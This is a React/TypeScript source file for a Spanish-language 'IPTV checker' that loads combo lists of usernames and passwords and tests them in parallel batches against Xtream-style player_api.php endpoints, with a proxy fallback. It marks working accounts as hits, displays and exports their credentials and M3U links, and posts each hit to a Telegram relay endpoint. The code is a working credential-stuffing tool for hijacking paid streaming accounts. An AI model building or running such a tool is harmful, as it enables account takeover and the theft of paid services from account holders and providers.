'use client'

import { useState, useCallback, useRef, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Copy, Play, Square, Loader2, Upload, ExternalLink,
  ChevronDown, X, Save, Clock, Trash2, Link, Zap, Shield,
  Radio, Hash, Timer, Eye, EyeOff, Download
} from 'lucide-react'
import { toast } from 'sonner'
import { apiFetch } from '@/lib/api-config'

// ============================================================
// Types
// ============================================================

interface IptvResult {
  id: string
  url: string
  status: 'hit' | 'bad' | 'timeout' | 'checking'
  host?: string
  username?: string
  password?: string
  info?: {
    status?: string
    active_cons?: string
    max_connections?: string
    created_at?: string
    exp_date?: string
    timezone?: string
    channels?: string
    films?: string
    series?: string
    real_url?: string
    real_port?: string
    m3u_url?: string
    [key: string]: unknown
  }
}

interface SavedSession {
  id: string
  inputMode: 'url' | 'combo'
  serverHost: string
  totalLines: number
  results: IptvResult[]
  stats: { total: number; hits: number; bad: number; timeout: number; totalLines: number }
  createdAt: string
}

// ============================================================
// Helpers
// ============================================================

function formatDate(val: string | number | null | undefined): string {
  if (!val || val === 'null') return 'N/A'
  if (typeof val === 'number') {
    if (val === 0) return 'Unlimited'
    return new Date(val * 1000).toLocaleDateString('es-CL', { day: '2-digit', month: '2-digit', year: 'numeric' })
  }
  const num = Number(val)
  if (!isNaN(num) && num > 0) {
    return new Date(num * 1000).toLocaleDateString('es-CL', { day: '2-digit', month: '2-digit', year: 'numeric' })
  }
  return String(val)
}

function timeAgo(dateStr: string): string {
  try {
    const diff = Date.now() - new Date(dateStr).getTime()
    const mins = Math.floor(diff / 60000)
    if (mins < 1) return 'Ahora'
    if (mins < 60) return `${mins}m`
    const hrs = Math.floor(mins / 60)
    if (hrs < 24) return `${hrs}h`
    const days = Math.floor(hrs / 24)
    return `${days}d`
  } catch {
    return ''
  }
}

// ============================================================
// Check Line Logic
// ============================================================

async function checkLine(
  line: string,
  inputMode: 'url' | 'combo',
  serverHost: string
): Promise<Omit<IptvResult, 'id'>> {
  let sHost = ''
  let username = ''
  let password = ''

  if (inputMode === 'combo' && serverHost) {
    const parts = line.split(':')
    if (parts.length < 2) return { status: 'bad', host: '', username: '', url: '' }
    username = parts[0].trim()
    password = parts.slice(1).join(':').trim()
    sHost = serverHost.replace(/^https?:\/\//, '').replace(/\/.*$/, '')
  } else {
    let parsedUrl: URL
    try {
      parsedUrl = new URL(line)
    } catch {
      return { status: 'bad', host: '', username: '', url: '' }
    }
    const hostname = parsedUrl.hostname
    const port = parsedUrl.port || '80'
    sHost = `${hostname}:${port}`
    username = parsedUrl.searchParams.get('username') || ''
    password = parsedUrl.searchParams.get('password') || ''
    if (!username || !password) return { status: 'bad', host: '', username: '', url: '' }
  }

  const checkUrl = `http://${sHost}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u`

  const parseIptvResponse = (text: string): Omit<IptvResult, 'id'> | null => {
    if (!text.includes('username')) return null
    try {
      const json = JSON.parse(text)
      const userInfo = json?.user_info || {}
      const serverInfo = json?.server_info || {}
      const accountStatus = String(userInfo.status || '')
      if (accountStatus === 'Active') {
        const m3uUrl = `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`
        return {
          status: 'hit', url: m3uUrl, host: sHost, username, password,
          info: {
            status: userInfo.status || 'Active',
            active_cons: String(userInfo.active_cons ?? '0'),
            max_connections: String(userInfo.max_connections ?? '0'),
            created_at: formatDate(userInfo.created_at),
            exp_date: formatDate(userInfo.exp_date),
            timezone: serverInfo?.timezone || userInfo?.timezone || 'N/A',
            channels: 'N/A', films: 'N/A', series: 'N/A',
            real_url: serverInfo?.url ? String(serverInfo.url) : '',
            real_port: serverInfo?.port ? String(serverInfo.port) : '',
            m3u_url: m3uUrl,
          },
        }
      }
    } catch {
      if (text.includes('Active')) {
        const fallbackM3uUrl = `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`
        return {
          status: 'hit', url: fallbackM3uUrl, host: sHost, username, password,
          info: { status: 'Active', active_cons: '0', max_connections: '0', created_at: 'N/A', exp_date: 'N/A', timezone: 'N/A' },
        }
      }
    }
    return null
  }

  // Strategy 1: Direct fetch
  try {
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 15000)
    const response = await fetch(checkUrl, { signal: controller.signal, mode: 'cors' })
    clearTimeout(timeoutId)
    const text = await response.text()
    const hitResult = parseIptvResponse(text)
    if (hitResult) return hitResult
    return { status: 'bad', host: sHost, username, url: '' }
  } catch (directError: unknown) {
    if (directError instanceof DOMException && directError.name === 'AbortError') {
      return { status: 'timeout', host: sHost, username, url: '' }
    }
    // Strategy 2: Vercel proxy fallback
    try {
      const proxyRes = await apiFetch('/api/iptv/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: checkUrl }),
      })
      const data = await proxyRes.json()
      if (data.status === 'timeout') return { status: 'timeout', host: sHost, username, url: '' }
      if (data.status === 'bad') return { status: 'bad', host: sHost, username, url: '' }
      if (data.error && !data.rawText) return { status: 'bad', host: sHost, username, url: '' }
      const text = data.rawText || ''
      const hitResult = parseIptvResponse(text)
      if (hitResult) return hitResult
      return { status: 'bad', host: sHost, username, url: '' }
    } catch {
      return { status: 'bad', host: sHost, username, url: '' }
    }
  }
}

// ============================================================
// localStorage — Separate per mode
// ============================================================

const STORAGE_KEY_URL = 'hjtools_iptv_url_sessions'
const STORAGE_KEY_COMBO = 'hjtools_iptv_combo_sessions'

function getStorageKey(mode: 'url' | 'combo') {
  return mode === 'url' ? STORAGE_KEY_URL : STORAGE_KEY_COMBO
}

function getSavedSessions(mode: 'url' | 'combo'): SavedSession[] {
  if (typeof window === 'undefined') return []
  try {
    const raw = localStorage.getItem(getStorageKey(mode))
    return raw ? JSON.parse(raw) : []
  } catch {
    return []
  }
}

function saveSessions(mode: 'url' | 'combo', sessions: SavedSession[]) {
  if (typeof window === 'undefined') return
  try {
    localStorage.setItem(getStorageKey(mode), JSON.stringify(sessions.slice(-20)))
  } catch { /* full */ }
}

function saveCurrentSession(session: SavedSession) {
  const sessions = getSavedSessions(session.inputMode)
  const idx = sessions.findIndex(s => s.id === session.id)
  if (idx >= 0) sessions[idx] = session
  else sessions.push(session)
  saveSessions(session.inputMode, sessions)
}

function deleteSession(mode: 'url' | 'combo', sessionId: string) {
  const sessions = getSavedSessions(mode).filter(s => s.id !== sessionId)
  saveSessions(mode, sessions)
}

function clearAllSessions(mode: 'url' | 'combo') {
  saveSessions(mode, [])
}

// ============================================================
// Sub-components
// ============================================================

function StatCard({ label, value, color, icon: Icon }: {
  label: string; value: number; color: string; icon: React.ElementType
}) {
  return (
    <div className="relative overflow-hidden bg-[#0c0c0e] rounded-xl border border-white/[0.04] p-3 text-center group">
      <div className="absolute inset-0 bg-gradient-to-b from-white/[0.02] to-transparent opacity-0 group-hover:opacity-100 transition-opacity" />
      <Icon className={`w-3.5 h-3.5 mx-auto mb-1.5 ${color} opacity-60`} />
      <motion.span
        key={value}
        initial={{ opacity: 0.5, y: -4 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.2 }}
        className={`text-lg font-bold font-mono ${color} block`}
      >
        {value}
      </motion.span>
      <p className="text-[9px] text-white/25 uppercase tracking-widest mt-0.5">{label}</p>
    </div>
  )
}

function HitCard({ r, index, isHistory }: { r: IptvResult; index: number; isHistory?: boolean }) {
  const info = r.info
  const m3uUrl = info?.m3u_url || r.url
  const [showPass, setShowPass] = useState(false)

  const copyHit = () => {
    const text = `User: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'} / ${info?.max_connections || '0'}\nExp: ${info?.exp_date || 'N/A'}\nM3U: ${m3uUrl}`
    navigator.clipboard.writeText(text)
    toast.success('Hit copiado')
  }

  return (
    <motion.div
      initial={{ opacity: 0, y: 8 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: index * 0.03, duration: 0.25 }}
      className="relative overflow-hidden rounded-xl border border-green-500/10 bg-[#0a0f0a]"
    >
      {/* Top accent line */}
      <div className="h-[1px] bg-gradient-to-r from-transparent via-green-500/60 to-transparent" />

      <div className="p-3.5">
        {/* Header */}
        <div className="flex items-center justify-between mb-3">
          <div className="flex items-center gap-2">
            <div className="w-5 h-5 rounded-md bg-green-500/15 flex items-center justify-center">
              <Zap className="w-3 h-3 text-green-400" />
            </div>
            <span className="text-[10px] font-bold text-green-400/80 uppercase tracking-[0.15em]">
              Hit #{index + 1}
            </span>
            {isHistory && (
              <span className="text-[8px] bg-white/[0.04] text-white/25 px-1.5 py-0.5 rounded font-mono">
                HIST
              </span>
            )}
          </div>
          <div className="flex items-center gap-1">
            <button
              onClick={() => setShowPass(!showPass)}
              className="p-1.5 rounded-lg hover:bg-white/[0.04] transition-colors"
              title={showPass ? 'Ocultar' : 'Mostrar'}
            >
              {showPass ? <EyeOff className="w-3 h-3 text-white/20" /> : <Eye className="w-3 h-3 text-white/20" />}
            </button>
            <button onClick={copyHit} className="p-1.5 rounded-lg hover:bg-white/[0.04] transition-colors" title="Copiar">
              <Copy className="w-3 h-3 text-white/20 hover:text-green-400 transition-colors" />
            </button>
          </div>
        </div>

        {/* Info grid */}
        <div className="grid grid-cols-2 gap-x-5 gap-y-1.5 text-[11px] font-mono">
          <div className="flex items-center gap-1.5">
            <span className="text-white/20 text-[9px]">USR</span>
            <span className="text-green-300/90 truncate">{r.username}</span>
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-white/20 text-[9px]">PWD</span>
            <span className="text-green-300/90 truncate">
              {showPass ? r.password : '••••••••'}
            </span>
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-white/20 text-[9px]">STS</span>
            <span className="text-emerald-400 text-[10px] font-semibold flex items-center gap-1">
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
              {info?.status || 'Active'}
            </span>
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-white/20 text-[9px]">CON</span>
            <span className="text-white/50">{info?.active_cons || '0'}<span className="text-white/15">/</span>{info?.max_connections || '0'}</span>
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-white/20 text-[9px]">CRT</span>
            <span className="text-white/40">{info?.created_at || 'N/A'}</span>
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-white/20 text-[9px]">EXP</span>
            <span className="text-amber-400/70">{info?.exp_date || 'N/A'}</span>
          </div>
        </div>

        {/* Actions */}
        <div className="flex items-center gap-2 mt-3 pt-2.5 border-t border-white/[0.03]">
          <button
            onClick={() => { navigator.clipboard.writeText(m3uUrl); toast.success('M3U URL copiada') }}
            className="flex items-center gap-1.5 text-[10px] bg-green-500/10 hover:bg-green-500/15 text-green-400/80 hover:text-green-400 px-2.5 py-1.5 rounded-lg transition-all font-medium"
          >
            <Link className="w-3 h-3" />
            M3U
          </button>
          <button
            onClick={copyHit}
            className="flex items-center gap-1.5 text-[10px] bg-white/[0.03] hover:bg-white/[0.06] text-white/40 hover:text-white/60 px-2.5 py-1.5 rounded-lg transition-all font-medium"
          >
            <Copy className="w-3 h-3" />
            Copiar
          </button>
          <div className="flex-1" />
          {r.host && (
            <span className="text-[9px] text-white/15 font-mono truncate max-w-[120px]">{r.host}</span>
          )}
        </div>
      </div>
    </motion.div>
  )
}

// ============================================================
// Main Component
// ============================================================

export function IptvChecker() {
  // ---- Form state ----
  const [comboList, setComboList] = useState('')
  const [serverHost, setServerHost] = useState('')
  const [threads, setThreads] = useState('5')
  const [inputMode, setInputMode] = useState<'url' | 'combo'>('url')
  const [fileName, setFileName] = useState('')
  const [lineCount, setLineCount] = useState(0)
  const fileInputRef = useRef<HTMLInputElement>(null)

  // ---- Job state ----
  const [isRunning, setIsRunning] = useState(false)
  const [results, setResults] = useState<IptvResult[]>([])
  const [stats, setStats] = useState({ total: 0, hits: 0, bad: 0, timeout: 0, totalLines: 0 })
  const [progress, setProgress] = useState(0)
  const stopRef = useRef(false)
  const resultsRef = useRef<IptvResult[]>([])
  const statsRef = useRef(stats)
  const currentSessionIdRef = useRef<string | null>(null)

  // ---- Saved sessions ----
  const [showHistory, setShowHistory] = useState(false)
  const [viewingSession, setViewingSession] = useState<SavedSession | null>(null)
  const [sessionsVersion, setSessionsVersion] = useState(0)

  // ---- Keep refs in sync ----
  resultsRef.current = results
  statsRef.current = stats

  // Refresh sessions list when version changes
  useEffect(() => {}, [sessionsVersion])

  // ---- Mode switch handler ----
  const switchMode = useCallback((mode: 'url' | 'combo') => {
    if (isRunning) return
    setInputMode(mode)
    setResults([])
    setStats({ total: 0, hits: 0, bad: 0, timeout: 0, totalLines: 0 })
    setProgress(0)
    setComboList('')
    setFileName('')
    setLineCount(0)
    setViewingSession(null)
    setShowHistory(false)
    stopRef.current = false
  }, [isRunning])

  // ---- File upload handler ----
  const handleFileUpload = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return
    if (!file.name.endsWith('.txt')) {
      toast.error('Solo archivos .txt')
      return
    }
    const reader = new FileReader()
    reader.onload = (ev) => {
      const text = ev.target?.result as string
      setComboList(text)
      setFileName(file.name)
      const lines = text.trim().split('\n').filter(l => l.trim())
      setLineCount(lines.length)
      toast.success(`${lines.length} combos cargados`)
    }
    reader.readAsText(file)
    e.target.value = ''
  }, [])

  // ---- Start check ----
  const startCheck = useCallback(async () => {
    const allLines = comboList.trim().split('\n').filter(l => l.trim())
    if (allLines.length === 0) {
      toast.error('Carga un combo o pega líneas')
      return
    }
    if (inputMode === 'combo' && !serverHost.trim()) {
      toast.error('Ingresa el servidor (host:port)')
      return
    }

    const sessionId = crypto.randomUUID()
    currentSessionIdRef.current = sessionId
    const concurrency = Math.min(Math.max(parseInt(threads) || 5, 1), 20)
    const totalLines = allLines.length

    setIsRunning(true)
    setResults([])
    setStats({ total: 0, hits: 0, bad: 0, timeout: 0, totalLines })
    setProgress(0)
    resultsRef.current = []
    stopRef.current = false
    setViewingSession(null)

    let processed = 0
    let hits = 0
    let bad = 0
    let timeoutCount = 0

    toast.info(`Verificando ${totalLines} líneas...`)

    for (let i = 0; i < allLines.length; i += concurrency) {
      if (stopRef.current) break

      const batch = allLines.slice(i, i + concurrency)
      const batchPromises = batch.map(async (line, idx) => {
        if (stopRef.current) return null
        const result = await checkLine(line.trim(), inputMode, serverHost.trim())
        return {
          id: `line-${i + idx}-${Date.now()}`,
          url: result.url || line.trim(),
          status: result.status,
          host: result.host,
          username: result.username,
          password: result.password,
          info: result.info,
        } as IptvResult
      })

      const batchResults = await Promise.all(batchPromises)
      const validResults = batchResults.filter((r): r is IptvResult => r !== null)

      for (const r of validResults) {
        processed++
        if (r.status === 'hit') {
          hits++
          apiFetch('/api/telegram/hit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ host: r.host, username: r.username, password: r.password, url: r.url, info: r.info, inputMode }),
          }).catch(() => {})
        }
        else if (r.status === 'timeout') timeoutCount++
        else bad++
      }

      const newResults = [...resultsRef.current, ...validResults]
      resultsRef.current = newResults
      setResults(newResults)

      const newStats = { total: processed, hits, bad, timeout: timeoutCount, totalLines }
      statsRef.current = newStats
      setStats(newStats)
      setProgress(totalLines > 0 ? Math.round((processed / totalLines) * 100) : 0)

      if (currentSessionIdRef.current === sessionId) {
        saveCurrentSession({
          id: sessionId, inputMode, serverHost: serverHost.trim(), totalLines,
          results: newResults, stats: newStats, createdAt: new Date().toISOString(),
        })
      }
    }

    setIsRunning(false)
    stopRef.current = false
    setSessionsVersion(v => v + 1)

    if (processed === totalLines) {
      toast.success(`Completado: ${hits} hits, ${bad} bad, ${timeoutCount} timeout`)
    } else {
      toast.info(`Cancelado: ${hits} hits encontrados`)
    }
  }, [comboList, inputMode, serverHost, threads])

  // ---- Stop check ----
  const stopCheck = useCallback(() => {
    stopRef.current = true
    setIsRunning(false)
    toast.info('Cancelando...')
  }, [])

  // ---- Save hits to file ----
  const saveHitsToFile = useCallback(() => {
    const hitResults = results.filter(r => r.status === 'hit')
    if (hitResults.length === 0) {
      toast.error('No hay hits para guardar')
      return
    }
    const text = hitResults.map((r, idx) => {
      const info = r.info
      const m3uUrl = info?.m3u_url || r.url
      return `Hit #${idx + 1}\nUser: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'}\nMax: ${info?.max_connections || '0'}\nCreated: ${info?.created_at || 'N/A'}\nExp: ${info?.exp_date || 'N/A'}\nM3U: ${m3uUrl}\n`
    }).join('\n---\n\n')

    const blob = new Blob([text], { type: 'text/plain' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `hits_${new Date().toISOString().slice(0, 10)}.txt`
    a.click()
    URL.revokeObjectURL(url)
    toast.success(`${hitResults.length} hits guardados`)
  }, [results])

  // ---- Derived ----
  const hitResults = results.filter(r => r.status === 'hit')
  const currentModeSessions = typeof window !== 'undefined' ? getSavedSessions(inputMode) : []
  const viewHitResults = viewingSession?.results?.filter(r => r.status === 'hit') || []

  return (
    <div className="space-y-4">

      {/* ── Input Card ── */}
      <div className="bg-[#0c0c0e] rounded-2xl border border-white/[0.05] overflow-hidden">
        {/* Mode selector — pill style */}
        <div className="p-3 pb-0">
          <div className="flex bg-[#060608] rounded-xl p-[3px] border border-white/[0.04]">
            <button
              onClick={() => switchMode('url')}
              disabled={isRunning}
              className={`flex-1 py-2 rounded-[10px] text-[11px] font-semibold transition-all duration-200 flex items-center justify-center gap-1.5 ${
                inputMode === 'url'
                  ? 'bg-amber-500 text-black shadow-lg shadow-amber-500/20'
                  : 'text-white/30 hover:text-white/50'
              }`}
            >
              <Link className="w-3.5 h-3.5" />
              URL Mode
            </button>
            <button
              onClick={() => switchMode('combo')}
              disabled={isRunning}
              className={`flex-1 py-2 rounded-[10px] text-[11px] font-semibold transition-all duration-200 flex items-center justify-center gap-1.5 ${
                inputMode === 'combo'
                  ? 'bg-amber-500 text-black shadow-lg shadow-amber-500/20'
                  : 'text-white/30 hover:text-white/50'
              }`}
            >
              <Hash className="w-3.5 h-3.5" />
              Combo Mode
            </button>
          </div>
        </div>

        {/* Input area */}
        <div className="p-3 space-y-2.5">
          {/* Server host (combo mode) */}
          {inputMode === 'combo' && (
            <div className="relative">
              <div className="absolute left-3 top-1/2 -translate-y-1/2">
                <Radio className="w-3.5 h-3.5 text-amber-500/50" />
              </div>
              <input
                type="text"
                value={serverHost}
                onChange={(e) => setServerHost(e.target.value)}
                disabled={isRunning}
                placeholder="Servidor host:port  ej: canal-pro.xyz:8080"
                className="w-full bg-[#060608] border border-amber-500/20 rounded-xl pl-9 pr-3 py-2.5 text-[11px] text-white placeholder-white/15 focus:outline-none focus:border-amber-500/40 focus:ring-1 focus:ring-amber-500/10 font-mono transition-all disabled:opacity-40"
              />
            </div>
          )}

          {/* Textarea (URL mode) */}
          {inputMode === 'url' && (
            <textarea
              value={comboList}
              onChange={(e) => setComboList(e.target.value)}
              disabled={isRunning}
              placeholder="Pega URLs IPTV aquí...&#10;http://host:port/get.php?username=USER&password=PASS"
              rows={4}
              className="w-full bg-[#060608] border border-white/[0.05] rounded-xl px-3 py-2.5 text-[11px] text-white placeholder-white/10 focus:outline-none focus:border-amber-500/30 focus:ring-1 focus:ring-amber-500/10 font-mono resize-none transition-all disabled:opacity-40"
            />
          )}

          {/* File upload (combo mode) */}
          {inputMode === 'combo' && (
            <div>
              <input ref={fileInputRef} type="file" accept=".txt" onChange={handleFileUpload} className="hidden" />
              <button
                onClick={() => fileInputRef.current?.click()}
                disabled={isRunning}
                className="w-full border border-dashed border-white/[0.06] hover:border-amber-500/30 rounded-xl py-4 flex flex-col items-center justify-center gap-1.5 transition-all group disabled:opacity-40 bg-[#060608]/50"
              >
                <Upload className="w-4 h-4 text-white/15 group-hover:text-amber-500/50 transition-colors" />
                <span className="text-[10px] text-white/20 group-hover:text-white/40 transition-colors font-medium">
                  {fileName ? fileName : 'Subir combo .txt'}
                </span>
                {lineCount > 0 && (
                  <span className="text-[9px] text-amber-500/50 font-mono bg-amber-500/5 px-2 py-0.5 rounded-full">{lineCount} líneas</span>
                )}
              </button>
            </div>
          )}

          {/* Controls row */}
          <div className="flex gap-2">
            <div className="relative">
              <div className="absolute left-2.5 top-1/2 -translate-y-1/2">
                <Timer className="w-3 h-3 text-white/15" />
              </div>
              <input
                type="number"
                value={threads}
                onChange={(e) => setThreads(e.target.value)}
                min="1"
                max="20"
                placeholder="Hilos"
                disabled={isRunning}
                className="w-[72px] bg-[#060608] border border-white/[0.05] rounded-xl pl-8 pr-2 py-2.5 text-[11px] text-white focus:outline-none focus:border-amber-500/30 font-mono transition-all disabled:opacity-40"
              />
            </div>
            <button
              onClick={startCheck}
              disabled={isRunning}
              className="flex-1 bg-amber-500 hover:bg-amber-400 disabled:opacity-50 disabled:cursor-not-allowed text-black font-bold rounded-xl py-2.5 text-[11px] transition-all flex items-center justify-center gap-2 shadow-lg shadow-amber-500/10 hover:shadow-amber-500/20"
            >
              {isRunning ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5" />}
              {isRunning ? 'Verificando...' : 'Iniciar Check'}
            </button>
            {isRunning && (
              <motion.button
                initial={{ scale: 0.8, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                onClick={stopCheck}
                className="bg-red-500/15 hover:bg-red-500/25 text-red-400 rounded-xl px-3 py-2.5 transition-all"
              >
                <Square className="w-3.5 h-3.5" />
              </motion.button>
            )}
          </div>
        </div>
      </div>

      {/* ── Progress ── */}
      {(isRunning || stats.total > 0) && stats.totalLines > 0 && (
        <div className="space-y-1">
          <div className="w-full bg-[#0c0c0e] rounded-full h-1 overflow-hidden border border-white/[0.04]">
            <motion.div
              className="h-full rounded-full bg-gradient-to-r from-amber-500 via-amber-400 to-amber-500"
              initial={{ width: 0 }}
              animate={{ width: `${progress}%` }}
              transition={{ duration: 0.3, ease: 'easeOut' }}
            />
          </div>
          <div className="flex justify-between text-[9px] text-white/15 font-mono px-0.5">
            <span>{stats.total} / {stats.totalLines}</span>
            <span>{progress}%</span>
          </div>
        </div>
      )}

      {/* ── Stats ── */}
      {stats.total > 0 && (
        <div className="grid grid-cols-4 gap-1.5">
          <StatCard label="Total" value={stats.total} color="text-white/70" icon={Shield} />
          <StatCard label="Hits" value={stats.hits} color="text-green-400" icon={Zap} />
          <StatCard label="Bad" value={stats.bad} color="text-red-400/80" icon={X} />
          <StatCard label="Timeout" value={stats.timeout} color="text-amber-400/80" icon={Timer} />
        </div>
      )}

      {/* ── Live Hit Results ── */}
      {hitResults.length > 0 && (
        <div className="space-y-2.5">
          <div className="flex items-center justify-between px-0.5">
            <div className="flex items-center gap-2">
              <div className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
              <h3 className="text-[10px] font-bold text-green-400/70 uppercase tracking-[0.2em]">Hits Encontrados</h3>
              <span className="text-[9px] text-white/15 font-mono bg-white/[0.03] px-1.5 py-0.5 rounded-full">{hitResults.length}</span>
            </div>
            <div className="flex items-center gap-1.5">
              <button
                onClick={saveHitsToFile}
                className="flex items-center gap-1 text-[10px] text-green-400/60 hover:text-green-400 transition-colors font-medium px-2 py-1 rounded-lg hover:bg-green-500/5"
              >
                <Download className="w-3 h-3" />
                Guardar
              </button>
              <button
                onClick={() => {
                  const text = hitResults.map((r, idx) => {
                    const info = r.info
                    const m3uUrl = info?.m3u_url || r.url
                    return `Hit #${idx + 1}\nUser: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'}\nMax: ${info?.max_connections || '0'}\nExp: ${info?.exp_date || 'N/A'}\nM3U: ${m3uUrl}`
                  }).join('\n\n')
                  navigator.clipboard.writeText(text)
                  toast.success(`${hitResults.length} hits copiados`)
                }}
                className="flex items-center gap-1 text-[10px] text-amber-400/60 hover:text-amber-400 transition-colors font-medium px-2 py-1 rounded-lg hover:bg-amber-500/5"
              >
                <Copy className="w-3 h-3" />
                Copiar Todo
              </button>
            </div>
          </div>
          <div className="max-h-[55vh] overflow-y-auto space-y-2 custom-scrollbar pr-0.5">
            {hitResults.map((r, i) => (
              <HitCard key={`hit-${r.id}`} r={r} index={i} />
            ))}
          </div>
        </div>
      )}

      {/* ── History ── */}
      {currentModeSessions.length > 0 && !isRunning && (
        <div className="space-y-2">
          {/* History toggle + clear */}
          <div className="flex items-center justify-between px-0.5">
            <button
              onClick={() => { setShowHistory(!showHistory); setViewingSession(null) }}
              className="flex items-center gap-2 text-[10px] text-white/25 hover:text-white/40 transition-colors font-medium"
            >
              <Clock className="w-3.5 h-3.5" />
              Historial {inputMode === 'url' ? 'URL' : 'Combo'} ({currentModeSessions.length})
              <ChevronDown className={`w-3 h-3 transition-transform duration-200 ${showHistory ? 'rotate-180' : ''}`} />
            </button>
            <button
              onClick={() => {
                clearAllSessions(inputMode)
                setViewingSession(null)
                setShowHistory(false)
                setSessionsVersion(v => v + 1)
                toast.success('Historial eliminado')
              }}
              className="flex items-center gap-1 text-[9px] text-red-400/30 hover:text-red-400/60 transition-colors font-medium px-2 py-1 rounded-lg hover:bg-red-500/5"
            >
              <Trash2 className="w-3 h-3" />
              Borrar todo
            </button>
          </div>

          <AnimatePresence>
            {showHistory && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: 'auto' }}
                exit={{ opacity: 0, height: 0 }}
                transition={{ duration: 0.2 }}
                className="overflow-hidden"
              >
                <div className="max-h-72 overflow-y-auto space-y-1.5 custom-scrollbar pr-0.5">
                  {currentModeSessions.map((session) => {
                    const sessionHits = session.results?.filter(r => r.status === 'hit') || []
                    const isViewing = viewingSession?.id === session.id
                    return (
                      <motion.div
                        key={session.id}
                        initial={{ opacity: 0, x: -8 }}
                        animate={{ opacity: 1, x: 0 }}
                        className={`bg-[#0a0a0c] rounded-xl border p-3 transition-all ${
                          isViewing ? 'border-amber-500/20 bg-amber-500/[0.02]' : 'border-white/[0.04]'
                        }`}
                      >
                        <div className="flex items-center gap-3">
                          {/* Hit indicator */}
                          <div className="w-8 h-8 rounded-lg bg-green-500/10 flex items-center justify-center shrink-0">
                            <span className="text-[10px] font-bold text-green-400">{session.stats.hits}</span>
                          </div>

                          {/* Info */}
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2">
                              <span className="text-[10px] font-mono text-white/50 truncate">
                                {session.inputMode === 'url' ? 'URL Mode' : session.serverHost}
                              </span>
                              <span className="text-[8px] text-white/15 bg-white/[0.03] px-1.5 py-0.5 rounded-full">
                                {timeAgo(session.createdAt)}
                              </span>
                            </div>
                            <div className="flex items-center gap-2.5 mt-0.5 text-[9px] text-white/20 font-mono">
                              <span>{session.totalLines} líneas</span>
                              <span className="text-green-500/40">{session.stats.hits} hits</span>
                              <span className="text-red-500/30">{session.stats.bad} bad</span>
                            </div>
                          </div>

                          {/* Actions */}
                          <div className="flex items-center gap-1 shrink-0">
                            {sessionHits.length > 0 && (
                              <button
                                onClick={() => setViewingSession(isViewing ? null : session)}
                                className="text-[9px] bg-white/[0.04] hover:bg-white/[0.08] text-white/40 hover:text-white/60 px-2.5 py-1.5 rounded-lg transition-all flex items-center gap-1 font-medium"
                              >
                                <Eye className="w-3 h-3" />
                                {isViewing ? 'Cerrar' : `${sessionHits.length} hits`}
                              </button>
                            )}
                            <button
                              onClick={() => {
                                deleteSession(inputMode, session.id)
                                if (isViewing) setViewingSession(null)
                                setSessionsVersion(v => v + 1)
                                toast.success('Sesión eliminada')
                              }}
                              className="p-1.5 rounded-lg hover:bg-red-500/10 text-white/15 hover:text-red-400/60 transition-all"
                              title="Eliminar sesión"
                            >
                              <Trash2 className="w-3 h-3" />
                            </button>
                          </div>
                        </div>
                      </motion.div>
                    )
                  })}
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      )}

      {/* ── Viewing historical session ── */}
      <AnimatePresence>
        {viewingSession && viewHitResults.length > 0 && (
          <motion.div
            initial={{ opacity: 0, y: 8 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -8 }}
            transition={{ duration: 0.2 }}
            className="space-y-2.5"
          >
            <div className="flex items-center justify-between px-0.5">
              <div className="flex items-center gap-2">
                <Clock className="w-3.5 h-3.5 text-white/15" />
                <h3 className="text-[10px] font-bold text-green-400/50 uppercase tracking-[0.2em]">
                  Hits de sesión anterior
                </h3>
                <span className="text-[9px] text-white/15 font-mono bg-white/[0.03] px-1.5 py-0.5 rounded-full">
                  {viewHitResults.length}
                </span>
              </div>
              <button
                onClick={() => {
                  const text = viewHitResults.map((r, idx) => {
                    const info = r.info
                    const m3uUrl = info?.m3u_url || r.url
                    return `Hit #${idx + 1}\nUser: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'}\nMax: ${info?.max_connections || '0'}\nExp: ${info?.exp_date || 'N/A'}\nM3U: ${m3uUrl}`
                  }).join('\n\n')
                  navigator.clipboard.writeText(text)
                  toast.success(`${viewHitResults.length} hits copiados`)
                }}
                className="flex items-center gap-1 text-[10px] text-amber-400/50 hover:text-amber-400 transition-colors font-medium px-2 py-1 rounded-lg hover:bg-amber-500/5"
              >
                <Copy className="w-3 h-3" />
                Copiar Todo
              </button>
            </div>
            <div className="max-h-[40vh] overflow-y-auto space-y-2 custom-scrollbar pr-0.5">
              {viewHitResults.map((r, i) => (
                <HitCard key={`hist-${r.id}`} r={r} index={i} isHistory />
              ))}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}
